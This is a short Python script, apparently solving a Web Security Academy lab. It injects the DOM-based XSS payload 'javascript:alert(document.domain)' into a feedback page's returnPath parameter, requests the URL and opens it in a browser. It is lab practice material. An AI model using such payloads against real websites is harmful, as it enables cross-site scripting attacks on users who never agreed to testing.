import requests
import webbrowser

base_url = 'https://LAB-ID.web-security-academy.net/' # Replace with your actual lab ID
payload = "javascript:alert(document.domain)"
final_url = f"{base_url}feedback?returnPath={payload}"

response = requests.get(url=final_url)

print("Response Status:", response.status_code)
if response.status_code == 200:
    print("Payload successfully submitted!")
    print(final_url)
    webbrowser.open(final_url)
else:
    print("Something went wrong.")